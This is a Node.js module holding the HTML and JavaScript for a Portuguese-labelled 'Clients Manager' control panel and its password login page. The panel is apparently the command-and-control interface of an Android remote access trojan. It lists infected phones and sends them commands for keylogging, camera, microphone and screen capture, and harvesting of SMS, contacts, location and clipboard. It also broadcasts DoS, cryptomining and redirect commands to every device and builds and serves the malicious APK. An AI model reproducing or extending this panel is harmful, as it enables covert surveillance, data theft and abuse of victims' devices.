module.exports.page = () => `<!doctype html><html><head><meta charset="utf-8">
<title>Clients Manager</title><style>
*{box-sizing:border-box;margin:0;font-family:system-ui,sans-serif}
body{background:#07090d;color:#d7e2ea;display:flex;height:100vh;overflow:hidden;font-size:13px}
#rail{width:56px;background:#0b1016;border-right:1px solid #16202b;display:flex;flex-direction:column;align-items:center;padding:12px 0;gap:14px}
#rail div{width:34px;height:34px;border-radius:9px;background:#131c26;display:grid;place-items:center;cursor:pointer;color:#5f7f96;font-size:17px}
#rail div.on{background:#12291c;color:#2ee66b}
#main{flex:1;display:flex;flex-direction:column;min-width:0}
#top{display:flex;align-items:center;gap:8px;padding:10px 14px;border-bottom:1px solid #16202b;flex-wrap:wrap}
h1{font-size:16px;color:#2ee66b;font-weight:700;margin-right:6px}
#q{flex:1;min-width:140px;max-width:400px;background:#0e161e;border:1px solid #1c2a36;border-radius:8px;padding:8px 11px;color:#cfe;outline:none;font-size:12px}
.btn{background:#0f1820;border:1px solid #1c2a36;border-radius:7px;padding:7px 10px;color:#9fc0d4;cursor:pointer;font-size:11px;white-space:nowrap}
.btn:hover{border-color:#2ee66b;color:#2ee66b}
#count{font-size:11px;color:#3d5a6e;margin-left:auto}
#list{flex:1;overflow:auto}
.hdr{display:grid;grid-template-columns:28px 26px 110px 130px 90px 70px 60px 50px 1fr;gap:8px;padding:7px 14px;font-size:10px;color:#3d5a6e;border-bottom:1px solid #0e161e;text-transform:uppercase;letter-spacing:.04em}
.row{display:grid;grid-template-columns:28px 26px 110px 130px 90px 70px 60px 50px 1fr;gap:8px;align-items:center;padding:9px 14px;border-bottom:1px solid #0a0f15;cursor:pointer;transition:background .1s}
.row:hover,.row.sel{background:#0d151d}
.dot{width:9px;height:9px;border-radius:50%;background:#2ee66b}
.dot.off{background:#2a3a48}
.tag{font-size:10px;padding:2px 6px;border-radius:4px;background:#0d2017;color:#2ee66b}
.tag.off{background:#111b23;color:#3d5a6e}
#side{width:286px;background:#0b1016;border-left:1px solid #16202b;padding:14px;overflow:auto;display:flex;flex-direction:column;gap:10px}
#side h2{font-size:13px;color:#2ee66b;font-weight:600}
.kv{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #0e161e;font-size:11px}
.kv span:first-child{color:#4d6e82}
#dock{display:grid;grid-template-columns:repeat(3,1fr);gap:6px}
#dock .btn{padding:12px 4px;font-size:10px;text-align:center}
#log{flex:1;min-height:120px;background:#060a0f;border:1px solid #131e28;border-radius:8px;padding:10px;overflow:auto;white-space:pre-wrap;font-family:ui-monospace,monospace;font-size:10.5px;color:#7aabcc;line-height:1.5}
#logtitle{font-size:10px;color:#3d5a6e;text-transform:uppercase;letter-spacing:.05em;display:flex;justify-content:space-between;align-items:center}
#logtitle span{cursor:pointer;color:#2ee66b}
#nodv{color:#2a3a48;font-size:12px;text-align:center;margin:40px auto}
</style></head><body>

<div id="rail">
  <div class="on" title="Clientes">◉</div>
  <div title="Build APK" onclick="build()">⚙</div>
  <div title="Download APK" onclick="location='/apk'">⬇</div>
</div>

<div id="main">
  <div id="top">
    <h1>Clients Manager</h1>
    <input id="q" placeholder="Buscar nome, IP, país, modelo…" oninput="render()">
    <span id="count"></span>
    <button class="btn" onclick="all('toast','Broadcast')">Broadcast</button>
    <button class="btn" onclick="all('redirect','https://google.com')">Redirect</button>
    <button class="btn" onclick="all('upd','')">Updates</button>
    <button class="btn" onclick="all('sms','')">SMS all</button>
    <button class="btn" onclick="all('dos','')">DoS</button>
    <button class="btn" onclick="all('mining','')">Mining</button>
  </div>
  <div class="hdr">
    <div></div><div></div><div>Dispositivo</div><div>IP</div>
    <div>Android</div><div>Bateria</div><div>Status</div><div>Cmds</div><div>País</div>
  </div>
  <div id="list"><div id="nodv">Sem clientes conectados</div></div>
</div>

<div id="side">
  <h2 id="sn">— selecione um cliente —</h2>
  <div id="info"></div>
  <div id="dock">
    <button class="btn" onclick="c('info')">Profile</button>
    <button class="btn" onclick="c('files')">Files</button>
    <button class="btn" onclick="c('screen')">Screen</button>
    <button class="btn" onclick="c('cam')">Camera</button>
    <button class="btn" onclick="c('mic')">Mic ×10s</button>
    <button class="btn" onclick="c('sms')">SMS</button>
    <button class="btn" onclick="c('contacts')">Contacts</button>
    <button class="btn" onclick="c('apps')">Apps</button>
    <button class="btn" onclick="c('keylog')">Keylogger</button>
    <button class="btn" onclick="c('loc')">Location</button>
    <button class="btn" onclick="c('browser')">Browser</button>
    <button class="btn" onclick="c('a11ytree')">A11y Tree</button>
    <button class="btn" onclick="c('clip')">Clipboard</button>
    <button class="btn" onclick="c('lock')">Lock screen</button>
    <button class="btn" onclick="c('toast')">Toast/Chat</button>
    <button class="btn" onclick="delDev()" style="color:#c0392b;border-color:#3a1010">Delete</button>
  </div>
  <div id="logtitle">
    <span>LOG</span>
    <span onclick="clearLog()">limpar</span>
  </div>
  <div id="log">selecione um dispositivo</div>
</div>

<script>
let devs=[], sel=null, logData=[];
const $ = id => document.getElementById(id);
const api = (p,b) => fetch(p,{method:b?'POST':'GET',headers:{'Content-Type':'application/json'},body:b?JSON.stringify(b):null}).then(r=>r.json());

function ts(t){ return new Date(t).toLocaleTimeString(); }

async function tick(){
  devs = await api('/api/devices');
  render();
  if(sel) {
    logData = await api('/api/logs/'+sel);
    renderLog();
  }
}

function render(){
  const f = ($('q').value||'').toLowerCase();
  const filtered = devs.filter(d => !f || JSON.stringify(d).toLowerCase().includes(f));
  $('count').textContent = filtered.length + '/' + devs.length + ' clientes';
  if(!filtered.length){ $('list').innerHTML='<div id="nodv">Nenhum resultado</div>'; return; }
  $('list').innerHTML = filtered.map(d =>
    \`<div class="row \${d.id===sel?'sel':''}" onclick="pick('\${d.id}')">
      <div>\${d.online?'<div class="dot"></div>':'<div class="dot off"></div>'}</div>
      <div style="font-size:18px">\${d.flag||'🌐'}</div>
      <div style="font-size:11px">\${(d.model||'?').substring(0,22)}</div>
      <div style="font-size:11px;color:#5a8099">\${d.ip||''}</div>
      <div style="font-size:11px">Android \${d.sdk||'?'}</div>
      <div style="font-size:11px">\${d.batt!=null?d.batt+'%':'?'}</div>
      <div><span class="tag \${d.online?'':'off'}">\${d.online?'online':Math.round((Date.now()-d.last)/60000)+'m'}</span></div>
      <div style="color:#2ee66b;font-size:12px">\${d.cmds||0}</div>
      <div style="font-size:11px;color:#3d5a6e">\${d.country||''}</div>
    </div>\`
  ).join('');
}

async function pick(id){
  sel=id; render();
  const d = devs.find(x=>x.id===id)||{};
  $('sn').textContent = (d.model||'device') + ' · ' + (d.country||'');
  $('info').innerHTML = [
    ['Modelo', d.model||'?'],
    ['Android SDK', d.sdk||'?'],
    ['Bateria', (d.batt!=null?d.batt+'%':'?')],
    ['SIM', d.sim||'N/A'],
    ['IP', d.ip||''],
    ['País', (d.flag||'')+ ' ' +(d.country||'')],
    ['Primeiro acesso', d.first?new Date(d.first).toLocaleString():''],
    ['Último acesso', d.last?new Date(d.last).toLocaleString():''],
    ['Keystrokes', d.logs||0],
  ].map(([k,v])=>\`<div class="kv"><span>\${k}</span><span>\${v}</span></div>\`).join('');
  logData = await api('/api/logs/'+id);
  renderLog();
}

function renderLog(){
  if(!logData.length){ $('log').textContent='(sem logs)'; return; }
  $('log').textContent = logData.slice(-80).map(x => {
    const t = ts(x.t);
    if(x.out && x.out.startsWith('@file:')){
      const [,fid,name,mime] = x.out.split(':');
      return \`[\${t}] \${x.cmd}\\n→ <a href="/api/file/\${fid}" target="_blank" style="color:#2ee66b">\${name}</a> (\${mime})\`;
    }
    return \`[\${t}] \${x.cmd}\\n\${x.out||''}\`;
  }).join('\\n\\n');
  $('log').innerHTML = $('log').innerHTML; // render links
  $('log').scrollTop = $('log').scrollHeight;
}

function clearLog(){ $('log').textContent=''; }

function c(cmd){
  if(!sel){ alert('Selecione um dispositivo'); return; }
  const arg = prompt(cmd + ' — argumento (vazio = padrão)') ?? '';
  if(arg === null) return;
  api('/api/cmd', {id:sel, cmd, arg});
}

function all(cmd, def){
  const arg = prompt('Broadcast ' + cmd + ' — argumento:', def) ?? '';
  if(arg === null) return;
  devs.forEach(d => api('/api/cmd', {id:d.id, cmd, arg}));
  alert('Enviado a ' + devs.length + ' dispositivos');
}

async function delDev(){
  if(!sel) return;
  if(!confirm('Deletar dispositivo ' + sel + '?')) return;
  await api('/api/del', {id:sel});
  sel=null; $('sn').textContent='— selecione —'; $('info').innerHTML=''; $('log').textContent='';
  tick();
}

async function build(){
  const ok = await api('/api/build', {});
  alert(ok.ok ? 'Build iniciado. APK estará disponível em ~6 min em /apk' : 'Falhou: ' + ok.status + ' — verifique GH_TOKEN/GH_REPO');
}

tick();
setInterval(tick, 5000);
</script></body></html>`;

module.exports.login = () => `<!doctype html><html><head><meta charset="utf-8"><title>painel</title>
<style>*{box-sizing:border-box;margin:0}body{background:#07090d;color:#cfe;font-family:system-ui;display:grid;place-items:center;height:100vh}
form{background:#0b1016;border:1px solid #16202b;border-radius:14px;padding:36px 32px;display:flex;flex-direction:column;gap:14px;width:280px}
h3{color:#2ee66b;font-size:18px;text-align:center;letter-spacing:.04em}
input{padding:11px 13px;background:#0e161e;border:1px solid #1c2a36;border-radius:9px;color:#cfe;outline:none;font-size:14px}
input:focus{border-color:#2ee66b}
button{padding:11px;background:#12291c;color:#2ee66b;border:1px solid #1a4028;border-radius:9px;font-size:14px;cursor:pointer;font-weight:600}
button:hover{background:#183620}
</style></head><body>
<form method="post" action="/login">
  <h3>Clients Manager</h3>
  <input name="pass" type="password" placeholder="senha" autofocus>
  <button>Entrar</button>
</form></body></html>`;
